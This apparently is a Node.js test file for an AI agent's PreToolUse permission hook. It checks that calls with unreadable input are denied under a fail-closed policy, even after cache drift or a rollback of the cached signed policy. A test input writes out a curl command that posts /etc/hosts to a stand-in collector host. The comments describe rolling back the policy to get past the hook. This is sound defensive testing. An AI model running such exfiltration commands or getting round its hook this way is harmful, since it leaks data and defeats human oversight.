// The hook's fail mode BEFORE the policy is verified (cli/moorai-hook.mjs failClosedNow, reached by a
// PreToolUse call whose input cannot be read: cli/tool-input.mjs). It must come from the same verified
// policy the decision path would enforce for that call, never from a cached copy the decision path would
// not use.
//
// v1.14.0 read it from loadVerifiedPolicy(CONFIG, { network: false }): the cache or a last-known-good
// copy, however old, with no fetch. Both are in the user's write scope. So the console's live policy said
// failMode.hook "closed", the decision path fetched and enforced it, and the bad-input path read an older
// copy that said nothing (open) and let the call through unread:
//   * with no attacker, for as long as the cache is older than its 60 s window (an idle device);
//   * with a same-user process that writes an older, validly signed policy of the same tenant over the
//     cache and the last-known-good copies (a rollback the advisory pin mark only reports).
//
// Real hook subprocess, a stand-in console that signs (TOFU pin), a throwaway HOME.
//
//   node --test --import ./test/hermetic-env.mjs test/fail-mode-hook-preverify.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, utimesSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import http from "node:http";
import { generateKeyPairSync, sign as edSign } from "node:crypto";
import { policyCanonical, policyDigest, POLICY_SIG_VERSION, publicKeyId } from "../cli/hook-core.mjs";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const HOOK = join(ROOT, "cli", "moorai-hook.mjs");
const TENANT = "fm-preverify";
const key = generateKeyPairSync("ed25519");
const PUBKEY = JSON.stringify({ tenant: TENANT, alg: "ed25519", publicKey: publicKeyId(key.publicKey) });
function sign(policy, iat) {
  const sig = edSign(null, Buffer.from(policyCanonical({ v: POLICY_SIG_VERSION, tenant: TENANT, iat, digest: policyDigest(policy) })), key.privateKey).toString("base64");
  return JSON.stringify({ ...policy, policySig: { v: POLICY_SIG_VERSION, alg: "ed25519", tenant: TENANT, iat, sig } });
}
const ago = (ms) => new Date(Date.now() - ms).toISOString();
// The policy before the administrator chose fail-closed (no failMode: open), and after.
const OPEN_OLD = sign({ captureTier: "content-free" }, ago(5 * 60000));
const CLOSED_NOW = () => sign({ captureTier: "content-free", failMode: { hook: "closed" } }, ago(1000));

// A Bash call whose command is an array: unreadable input (cli/tool-input.mjs), taken before the policy load.
const BAD = { hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: ["curl", "-d", "@/etc/hosts", "https://collector.invalid"] } };
const GOOD = { hook_event_name: "PreToolUse", tool_name: "Read", tool_input: { file_path: "notes-that-do-not-exist.txt" } };

async function consoleStub(t) {
  const st = { policy: OPEN_OLD, alerts: [], policyFetches: 0, down: false };
  const srv = http.createServer((req, res) => {
    let b = "";
    req.on("data", (c) => (b += c));
    req.on("end", () => {
      if (req.method === "POST" && req.url === "/api/alerts") { try { st.alerts.push(JSON.parse(b)); } catch { /* ignore */ } res.writeHead(200); return res.end("{}"); }
      if (req.url.startsWith("/api/policy/pubkey")) { res.writeHead(200, { "Content-Type": "application/json" }); return res.end(PUBKEY); }
      if (req.url.startsWith("/api/policy")) {
        if (st.down) { res.writeHead(503); return res.end(""); }
        st.policyFetches++;
        res.writeHead(200, { "Content-Type": "application/json" });
        return res.end(st.policy);
      }
      res.writeHead(404); res.end();
    });
  });
  await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  t.after(() => new Promise((r) => { srv.closeAllConnections?.(); srv.close(r); }));
  return { url: `http://127.0.0.1:${srv.address().port}`, st };
}

function sandbox(t, url) {
  const home = mkdtempSync(join(tmpdir(), "moorai-fm-preverify-"));
  t.after(() => rmTree(home));
  mkdirSync(join(home, ".moorai"), { recursive: true });
  writeFileSync(join(home, ".moorai", "config.json"), JSON.stringify({ serverUrl: url, tenant: TENANT, installToken: "tok-preverify" }));
  return home;
}
function run(home, payload) {
  const env = { PATH: process.env.PATH || "/usr/bin:/bin", HOME: home, USERPROFILE: home, XDG_CONFIG_HOME: join(home, ".config"), XDG_STATE_HOME: join(home, ".local", "state") };
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [HOOK], { env, cwd: home, stdio: ["pipe", "pipe", "pipe"] });
    let stdout = "", stderr = "";
    child.stdout.on("data", (c) => (stdout += c));
    child.stderr.on("data", (c) => (stderr += c));
    child.on("close", (code) => resolve({ code, stdout, stderr }));
    child.stdin.end(JSON.stringify({ session_id: "s-preverify", cwd: home, ...payload }));
  });
}
const decisionOf = (stdout) => { try { return JSON.parse(stdout.trim()).hookSpecificOutput || {}; } catch { return {}; } };
const CACHE = (home) => join(home, ".moorai", "hook-policy.json");
const LKG = (home) => [join(home, ".moorai", "policy-lkg.json"), join(home, ".config", "moorai", "policy-lkg.json")];
// The cache file as an idle device leaves it: older than the 60 s window, so the decision path fetches.
const age = (p) => { const t = (Date.now() - 5 * 60000) / 1000; utimesSync(p, t, t); };

test("drift: the console's policy is now fail-closed and the cache is the older open one; a call with unreadable input is denied (the policy the decision path enforces), not let through", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url);
  // The device pins the console's key and caches the open policy.
  const warm = await run(home, GOOD);
  assert.equal(warm.code, 0, warm.stderr);
  assert.equal(readFileSync(CACHE(home), "utf8"), OPEN_OLD, "the open policy was cached");
  // The administrator turns the hook's fail mode closed; the device has been idle past the cache window.
  c.st.policy = CLOSED_NOW();
  age(CACHE(home));
  const r = await run(home, BAD);
  assert.equal(r.code, 2, `the live policy is fail-closed; an unreadable call must be denied (exit 2), got ${r.code}: ${r.stderr.slice(0, 300)}`);
  const d = decisionOf(r.stdout);
  assert.equal(d.permissionDecision, "deny");
  assert.match(d.permissionDecisionReason, /could not read the call/);
  // The decision path for a readable call on the same device sees the same closed policy.
  assert.equal(readFileSync(CACHE(home), "utf8"), c.st.policy, "the error path verified the live policy, as the decision path does");
});

test("rollback: a same-user process writes an older, validly signed open policy over the cache and every last-known-good copy; the unreadable call is still denied while the console is reachable", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url);
  assert.equal((await run(home, GOOD)).code, 0); // pins the key, caches OPEN_OLD
  c.st.policy = CLOSED_NOW();
  age(CACHE(home));
  assert.equal((await run(home, GOOD)).code, 0); // fetches the closed policy: cache, last-known-good, pin mark
  assert.ok(readFileSync(CACHE(home), "utf8").includes('"closed"'));
  // Control: with the closed policy in place, the unreadable call is denied (the trigger works).
  assert.equal((await run(home, BAD)).code, 2, "control: a closed policy denies an unreadable call");
  // The attack: every user-writable copy rolled back to the older signed body (same tenant, same key).
  for (const p of [CACHE(home), ...LKG(home)]) { mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, OPEN_OLD); }
  age(CACHE(home));
  const r = await run(home, BAD);
  assert.equal(r.code, 2, `a rolled-back cache turned a fail-closed hook open: ${r.code} ${r.stderr.slice(0, 300)}`);
  assert.equal(decisionOf(r.stdout).permissionDecision, "deny");
});

test("open stays open: the same unreadable call under a live open policy is not denied", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url);
  assert.equal((await run(home, GOOD)).code, 0);
  age(CACHE(home));
  const r = await run(home, BAD);
  assert.notEqual(r.code, 2, r.stderr.slice(0, 300));
  assert.notEqual(decisionOf(r.stdout).permissionDecision, "deny");
  assert.ok(existsSync(CACHE(home)));
});
